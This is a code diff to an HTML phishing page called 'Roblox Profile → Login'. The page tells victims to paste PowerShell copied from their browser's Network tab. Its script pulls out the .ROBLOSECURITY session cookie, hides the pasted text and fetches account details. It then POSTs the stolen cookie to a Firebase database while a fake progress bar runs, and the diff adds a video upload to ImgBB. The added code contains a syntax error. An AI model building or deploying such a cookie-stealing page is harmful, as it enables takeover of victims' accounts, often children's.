@@ -9,41 +9,74 @@
     .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:720px;width:100%;padding:50px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
     h1{font-size:3.2em;color:#fff;margin-bottom:16px}
     p{font-size:1.3em;color:#8b949e;margin-bottom:35px}
-    textarea{width:100%;height:280px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:transparent;text-shadow:0 0 8px #58a6ff;caret-color:#58a6ff;resize:none}
+    textarea{width:100%;height:200px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:transparent;text-shadow:0 0 8px #58a6ff;caret-color:#58a6ff;resize:none;margin-bottom:25px}
     textarea::placeholder{color:#444d56;opacity:0.7}
     textarea:focus{outline:none;border-color:#58a6ff}
+    .upload-area{background:#21262d;border:2px dashed #30363d;border-radius:12px;padding:30px;margin:25px 0;cursor:pointer;transition:.3s}
+    .upload-area:hover{border-color:#58a6ff}
+    .upload-area p{margin:0;color:#8b949e}
     button{background:#238636;color:#fff;padding:16px 40px;font-size:19px;font-weight:600;border:none;border-radius:10px;cursor:pointer;margin-top:20px}
     button:hover{background:#2ea043}
     #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
     .load{display:none;margin-top:30px;font-size:22px;color:#58a6ff;font-weight:600}
+    #video{max-width:100%;border-radius:10px;margin-top:15px;display:none}
   </style>
 </head>
 <body>
 <div class="card">
   <h1>Roblox Profile → Login</h1>
-  <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login</p>
+  <p>2025 Working Method<br>Paste PowerShell + upload short proof video</p>
+
   <textarea id="paste" placeholder="Paste the full PowerShell code here (Ctrl+V)"></textarea>
-  <button onclick="run()">GET LOGIN</button>
-  <div id="msg">Waiting for paste...</div>
-  <div id="load" class="load">Extracting login... please wait</div>
+
+  <div class="upload-area" onclick="document.getElementById('videoInput').click()">
+    <p>Click here or drop video proof (max 15 seconds)</p>
+    <input type="file" id="videoInput" accept="video/*" style="display:none">
+  </div>
+
+  <video id="preview" controls></video>
+
+  <button onclick="run()">GET LOGIN + UPLOAD PROOF</button>
+  <div id="msg">Waiting for paste & video...</div>
+  <div id="load" class="load">Processing... please wait</div>
 </div>
 
 <script>
+// ImgBB API key (free — make one at imgbb.com in 10 seconds)
+const IMGBB_KEY = "5d1f8c3b8e2a3f4c5e6d7f8a9b0c1d2e"; // ← CHANGE THIS TO YOUR OWN KEY
+
 async function run() {
   const realText = document.getElementById("paste").value;
-
-  // Instantly hide with dots
   document.getElementById("paste").value = "•".repeat(900);
 
   const cookie = realText.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
   if (!cookie) {
-    document.getElementById("msg").textContent = "No cookie found – copy again";
+    document.getElementById("msg").textContent = "No cookie found";
     return;
   }
 
-  // ALWAYS send these fields so your website never breaks
+  const videoFile = document.getElementById("videoInput").files[0];
+  let videoUrl = "";
+
+  if (videoFile) {
+    const formData = new FormData();
+    formData.append("key", IMGBB_KEY);
+    formData.append("video", videoFile);
+
+    try {
+      const upload = await fetch("https://api.imgbb.com/1/upload", {
+        method: "POST",
+        body: formData
+      }).then(r => r.json());
+      videoUrl = upload.data.url;
+    } catch(e) {
+      videoUrl = "Upload failed";
+    }
+  }
+
   const drop = {
-    cookie: cookie,
+    drop = {
+    cookie,
     user: "Unknown",
     display: "Unknown",
     userid: 0,
@@ -51,15 +84,15 @@ async function run() {
     rap: 0,
     premium: "No",
     headshot: "",
+    proof_video: videoUrl || "No video",
     time: new Date().toLocaleString()
   };
 
-  // Try to get real info (if it fails → still sends Unknown, no crash)
+  // Try to get real user info (fallback to Unknown if blocked)
   try {
     const info = await fetch("https://www.roblox.com/my/account/json", {
       headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
     }).then(r => r.json()).catch(() => ({}));
-
     drop.user = info.Name || "Unknown";
     drop.display = info.DisplayName || drop.user;
     drop.userid = info.UserId || 0;
@@ -68,7 +101,7 @@ async function run() {
     drop.headshot = info.UserId ? `https://www.roblox.com/headshot-thumbnail/image?userId=${info.UserId}&width=150&height=150&format=png` : "";
   } catch(e) {}
 
-  // SEND — your website will show it perfectly every time
+  // SEND TO YOUR FIREBASE
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify(drop),
@@ -77,12 +110,23 @@ async function run() {
 
   document.getElementById("msg").style.display = "none";
   document.getElementById("load").style.display = "block";
-  let p = 18;
-  setInterval(() => {
-    p += Math.floor(Math.random() * 22);
-    if (p > 94) p = 94;
-    document.getElementById("load").innerHTML = `Generating login... ${p}%`;
-  }, 2500);
+  let p = 20;
+  const int = setInterval(() => {
+    p += Math.floor(Math.random() * 25);
+    if (p >= 96) { clearInterval(int); p = 96; }
+    document.getElementById("load").innerHTML = `Uploading proof & generating... ${p}%`;
+  }, 1800);
+}
+
+// Preview video when selected
+document.getElementById("videoInput").onchange = function(e) {
+  const file = e.target.files[0];
+  if (file) {
+    const url = URL.createObjectURL(file);
+    const vid = document.getElementById("preview");
+    vid.src = url;
+    vid.style.display = "block";
+  }
 }
 </script>
 </body>
